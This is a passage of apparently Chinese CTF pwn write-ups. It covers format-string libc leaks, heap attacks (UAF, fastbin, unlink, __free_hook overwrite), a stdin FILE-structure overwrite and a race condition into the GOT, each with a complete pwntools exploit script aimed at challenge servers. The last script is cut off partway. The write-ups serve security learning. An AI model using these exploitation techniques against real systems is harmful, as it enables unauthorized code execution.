class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure><p>可是运行一下发现，if的检查没有过去，出现了死循环。把第四行注释取消调试一下。</p><p><img src="../img/2706180-20220514181236179-1811812982.png" alt=""></p><p>发现此时来到了if判断的地方，然后我们查看一下$rbp-0x24的值，发现末尾的是个什么玩意？989A68？ 这个肯定是过不了判断的。回想起现在看的是个十六进制的数字，我们用计算器转一下十进制看看。</p><p><img src="../img/2706180-20220514181247254-599152087.png" alt=""></p><p>豁然开朗，<strong>因为我们输入的是十进制类型的数据，但是最后宏来取某个字节进行判断的时候，是对十六进制的数据进行操作的</strong>。因此为了绕过判断，我们要用十六进制的数据绕过，然后把其转换成十进制的数据输入。因此我们应该把10001000这个值改成a001000（a代表第四字节（我从低地址开始数的）设置成10为了执行malloc，第三字节的00，无所谓只要能绕过最开始的检查即可，第二字节的10代表的是malloc申请chunk的大小，第一字节的00相当于是unk_202060的索引，用来找到不同的堆块），然后转换成十进制输入。</p><p>所以最后的发送应该是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>目前我们已经掌握了绕过if的方法，接下来就是调试来布局了。首先我们要溢出，不过在此之前我们肯定是要申请两个堆块，然后free掉后申请的那个堆块，去执行memcpy来修改free掉堆块的fd指针，再malloc回来。</p><p>值得一提的是，memcpy复制的内容是在这里输入的，我们应该提前在这里布局一下。</p><p><img src="../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p><h3 id="sprintf的格式化字符串漏洞">sprintf的格式化字符串漏洞</h3><p>我们要将fd指针修改为__free_hook的地址，获取这个地址的前提是拿到libc基地址。此时就要用到前面的格式化字符串漏洞了，先看一下sprintf函数的执行情况。</p><p><img src="../img/2706180-20220514180302267-1280701485.png" alt="image-20220514101654530"></p><p>发现偏移15的地方存在__libc_start_main函数地址。不过由于这是sprintf函数，它的参数format存在rsi寄存器上，rdi已经被第一个参数占了，再填数据时是从rsi开始，跳过了rdi寄存器。因此是20（15+5）</p><p>此处接收libc基地址的payload为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span><span class="comment">#0x21c87是泄露的地址与libc基地址的偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>然后就可以获取__free_hook的地址了，我们将其布置在这个地方</p><p><img src="../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p><p>此时我们利用溢出将free掉的chunk的fd指针改成了__free_hook的地址，同时可以看见bins中已经出现了__free_hook的地址（如下图）</p><p><img src="../img/2706180-20220514182802712-1937798255.png" alt=""></p><p>此时的payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(free_hook)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后我们只需要两次malloc，就可以申请到一个位置在__free_hook地址上的堆块。</p><p>接着我们用memcpy函数把system的地址写在__free_hook堆块里（效果如下），此时__free_hook指向的就是system了。</p><p><img src="../img/2706180-20220514181316800-65373104.png" alt=""></p><p><img src="../img/2706180-20220514180301381-730330410.png" alt="image-20220514154108694"></p><p>最后我们要free掉一个chunk，这个chunk里面装的都有什么不重要，只需要让这个chunk的地址去指向/bin/sh这个字符串即可（是指向的字符串，而非字符串的地址，因为system需要的是一个指向/bin/sh的地址，chunk的地址已经是一个指针了，我们并不需要再传一个指针，只需要写入字符串/bin/sh即可）</p><p><img src="../img/2706180-20220514180300891-657482779.png" alt="image-20220514155318872"></p><p>最后执行free即可获取shell。</p><h2 id="EXP">EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)</span><br><span class="line">fake_chunk2=p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line">p.send(fake_chunk2)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776258&#x27;</span>)<span class="comment">#malloc(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184614914&#x27;</span>)<span class="comment">#memcpy(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326592&#x27;</span>)<span class="comment">#free(0)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 堆溢出 </tag>
            
            <tag> 劫持free_hook </tag>
            
            <tag> ida新建结构体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb_2018_1st_babyheap</title>
      <link href="/posts/ebc85e8a.html"/>
      <url>/posts/ebc85e8a.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结">总结</h2><p>通过这道题的学习与总结有：</p><p>这道题考察的依然是利用UAF打unlink。unlink攻击的核心是可以伪造fake_chunk以及控制fake_chunk下面的堆块的chunk头。虽然无法直接溢出，但是我们可以做一个double free，然后打fastbin attack将chunk头申请出来(在低地址堆块中写入size，保证chunk头可以从fastbin上出来)，接着就可以打unlink了。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220905195216743-36339851.png" alt=""></p><h2 id="程序分析">程序分析</h2><p>程序中就存在一个UAF漏洞(如下图)</p><p><img src="../img/2706180-20220905195226020-1085425690.png" alt=""></p><p>同时限制了我们使用edit函数的次数为3次，限制了add函数的次数10次。最关键的是我们无法控制malloc出来堆块的大小，定死的size就是0x30。(如下图)</p><p><img src="../img/2706180-20220905195236331-894639914.png" alt=""></p><p>然后下面自定义的输入函数也不存在off by one以及溢出。</p><p><img src="../img/2706180-20220905195245678-421374853.png" alt=""></p><h2 id="利用思路：">利用思路：</h2><p>因为我们malloc申请的堆块大小是固定的0x30字节的，这样我们就没法得到libc地址，我们必须想办法让堆块进入unsorted bin中，这样执行show函数才能获取libc地址。所以我们肯定是要利用double free+fastbin attack将chunk头申请出来去修改堆块的size。</p><p>在这之前我们需要获取堆地址，然后多垫几个堆块，保证修改之后，堆块地址加上自身size后依然可以找到下一个正确的堆块地址。因为我们要将chunk头申请出来，就意味着我们需要伪造一个size，去通过fastbin的检查。<strong>（edit函数用的时候要慎重，最后我们打unlink写入地址时就需要用掉两个edit函数的机会，所以我们前面的各种布局只能用一次edit函数，而且这次肯定还是要在fastin attack的时候用）</strong></p><p>然后我们下面放三种堆块布局，分别是正常的堆块A和堆块B，伪造size，申请chunk B head的布局，unlink时的堆块A和堆块B布局</p><p><strong>正常的堆块A和堆块B布局如下：</strong></p><p><img src="../img/2706180-20220905195256837-2078069966.png" alt=""></p><p>因为<strong>我们想把chunk B head申请出来，因此我们需要伪造size</strong>，如下：</p><p>我解释一下这个图，首先我们是要控制chunk B head，因此我们先打一个double free+fastbin attack，将fake chunk（也就是黑色框中的部分）申请出来，这样我们往fake chunk中写入数据，就可以控制chunk B head了(将chunk B的size改成0xa0)，而在这之前我们需要在chunk A中的用户区写入0x31这个size(否则无法通过从fastbin中申请chunk的检查)</p><p><img src="../img/2706180-20220905195309452-65115390.png" alt=""></p><p>上一步可以控制chunk B head后，我们把chunk B释放掉后，它就进入了unsorted bin中。同时别忘记unlink的条件，我们需要一个大于fastbin 范围的堆块作为引线堆块，所以释放这个chunk B的时候，我们还需要顺便打一个unlink。另外我们还需要布局一个fake chunk，这个fake chunk的size肯定要是0x20，因此我们需要修改下chunk A中的user data，但是我们不能再用edit函数了，所以这里采用的方法是释放掉chunk A，然后再申请回来，写入0x21这个size，同时还要写入ptr-0x18和ptr-0x10。</p><p><strong>最终的unlink时布局如下</strong>：</p><p><img src="../img/2706180-20220905195319371-1640510939.png" alt=""></p><p>emmm，只要是熟悉unlink的师傅，应该都能看懂上面这个布局，最后提一下这个fake chunk是打fastbin attack强行错位申请出来的。<u>而为什么这个fake chunk的头必须要从0x603010开始，不能从0x603020开始？这是因为chunk B的地址是定死的，而它上面的内存单元必须是ptr-0x18和ptr-0x10，如果0x603020这个地址当做fake chunk head的话，那么0x603020这里应该是fake chunk的prev size，这样就不是ptr-0x18了，所以fake chunk必须在0x603010的地址开始。</u></p><p>然后打一个unlink，此时我们就可以控制bss段存放堆块的地址了，而此时我们还有两次执行edit函数的机会。由于我们在chunk B释放后执行show函数也得到了libc地址，因此我们直接用edit函数写一个free_hook的地址在bss段上，再edit函数往里写一个system的地址。最后free掉一个存有/bin/sh\x00字符串的堆块即可获取shell。</p><h2 id="EXP">EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400D7D</span></span><br><span class="line">d_a=<span class="number">0x400D59</span></span><br><span class="line">d_e=<span class="number">0x400D65</span></span><br><span class="line">d_s=<span class="number">0x400D71</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25004&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">    add(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_addr-<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    </span><br><span class="line">    ptr=<span class="number">0x602060</span></span><br><span class="line">    add(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#debug(p,0x400C86,d_d,d_a,d_s,d_e,0x400BD9)</span></span><br><span class="line">    add(<span class="number">5</span>,p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=search_og(<span class="number">0</span>)+libc_base</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_hook))</span><br><span class="line">    edit(<span class="number">0</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220905195333982-307285379.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>whctf2017 pwn题wp</title>
      <link href="/posts/1694f8f0.html"/>
      <url>/posts/1694f8f0.html</url>
      
        <content type="html"><![CDATA[<p>今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到</p><h2 id="总结">总结</h2><p>简单总结一下这四道题，它们分别考察了如下的知识点：</p><p>第一题考察了scanf函数最终的输入是在内部的<code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>这行代码，只要能控制这几个字段并且对其他一些字段进行绕过，就可以实现IO的任意地址写</p><p>第二题考察了条件竞争漏洞，在多线程的操作中访问同一个全局变量没有加锁，在delete函数中让全局指针被减到了位于got表的位置，从而malloc申请堆块的地址写入了got表里，没有开NX导致堆可执行，从而劫持got表跳转到堆的shellcode上</p><p>第三题考察的是snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。<strong>snprintf拷贝字符的时候可能存在溢出</strong></p><p>第四题考察的是未初始化漏洞，在打印之前，没有对操作的指针进行初始化，从而使用了栈里的残留数据，泄露出了canary，配合gets的栈溢出漏洞，ret2libc获取shell</p><h2 id="whctf2017-stackoverflow">whctf2017_stackoverflow</h2><h3 id="保护策略">保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" /><h3 id="漏洞所在">漏洞所在</h3><p>第一个漏洞点是往栈里输入数据之后没有0截断，并且使用了%s打印数据，从而可以泄露栈里存储的libc地址(如下)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" /><p>第二个漏洞是v2和size可以不一样，如果size大于0x300000的话，可以重新输入size(但是v2没有被更新)，而malloc函数申请大于128KB(0x20000 bit)的内存时会调用mmap在内存共享区映射出来一块内存，这片内存和libc里的地址存在固定偏移，我们提前控制一个v2的话就可以向任意一个libc地址写入一个0(如下)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" /><h3 id="利用思路">利用思路</h3><p>scanf的调用流程为scanf-&gt;vfscanf-&gt;__uflow-&gt;_IO_default_uflow()-&gt;underflow-&gt;_IO_file_underflow()</p><p>在最后的这个函数中有段代码调用了read  如下</p><p><code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></p><p>如果我们可以控制IO_buf_base，并且保证_IO_buf_end - _IO_buf_base不为0，就能实现地址任意写的目的。</p><p>不过需要绕过下面的检查，也就是要IO_read_ptr等于IO_read_end</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure><p>我们的思路是向_IO_buf_base的地址里写入一个0，从而去再次控制_IO_buf_base字段。如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" /><p>此时的buf_base中的地址末尾已经被篡改为了00，所以下次可以向0x7f8d614a3900这个地址里写入(buf_end-buf_base)个字节的数据，该地址是_IO_write_base字段，下次输入的话，我们控制buf_base为malloc_hook的地址，而buf_end至少要为malloc_hook-8（因为buf_end-buf_base就是下次往malloc_hook里写入的字节数）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png" alt="image-20221213110142157"></p><p>篡改后的buf_base和buf_end如下，此时还无法往malloc_hook里写入数据，因为_IO_read_ptr和_IO_read_end并不相同。而当前函数被不断循环，其中IO_getc(stdin)函数可以刷新_IO_read_ptr，让其从输入缓冲区中读入一个字节的数据，并且让read_ptr指针加1，因此我们随便输入数据，触发getc函数39次就可以让read_ptr和read_end相同，从而往malloc_hook里写入one_gadget，在之后调用malloc函数的时候即可获取shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png" alt="image-20221213110433209"></p><h3 id="EXP">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25978&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;leave your name, bro:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x7b947</span><span class="comment">#-0x7b957#</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5c5908</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x200000</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">debug(p,<span class="number">0x400A45</span>,<span class="number">0x4008FF</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x18</span>+p64(malloc_hook)+p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,p64(search_og(<span class="number">3</span>)+libc_base))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png" alt="image-20221213111146066"></p><h2 id="whctf2017-note-sys">whctf2017_note_sys</h2><h3 id="保护策略-v2">保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" /><h3 id="漏洞所在-v2">漏洞所在</h3><p>本题是有一个add函数和delete函数，不过都是去创建了一个子进程来调用函数。</p><p>在两个函数中都涉及到了对同一个全局变量进行操作，在add函数中malloc申请堆块后将地址存入了202080指向的位置(这个位置是2020C0)，每次执行add函数的时候都会将202080指向的地址+8，也就是执行完当前函数再执行add函数，就是将malloc返回的地址写入2020c8里</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" /><p>而执行delete函数则是每次执行完都让202080指向的地址-8(如下)，但需要注意的是先在202080指向的地址-8之后有一个usleep（这里会休眠两秒钟），而后再去执行下面的free函数部分</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" /><h3 id="利用思路-v2">利用思路</h3><p>核心点是delete函数在子进程中被执行，并且父进程里没有pthread_join函数，这意味着我们可以趁着子进程执行delete函数的空隙，让父进程再次调用delete函数，让202080指向的地址2020c0不断去-8，减到got表的位置。再执行add函数，malloc申请一个堆块，向堆块里写入shellcode，此时malloc返回的地址被写入到了free的got表里，最终调用free函数的时候触发shellcode</p><p>正常情况下去free掉got地址会报错，但此处的条件竞争是在执行free函数前不断开启多个子进程对一个全局变量进行操作，<strong>还没有执行到free函数崩溃前就已经把shellcode写到了free的got表里获取了shell</strong></p><p>循环22次也很好算 (0x2020c0-0x202018-8)/8=22   （这里不能直接写free的got地址，应该再减8字节，因为最后add的时候是先加了八字节）</p><h3 id="EXP-v2">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28673&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span 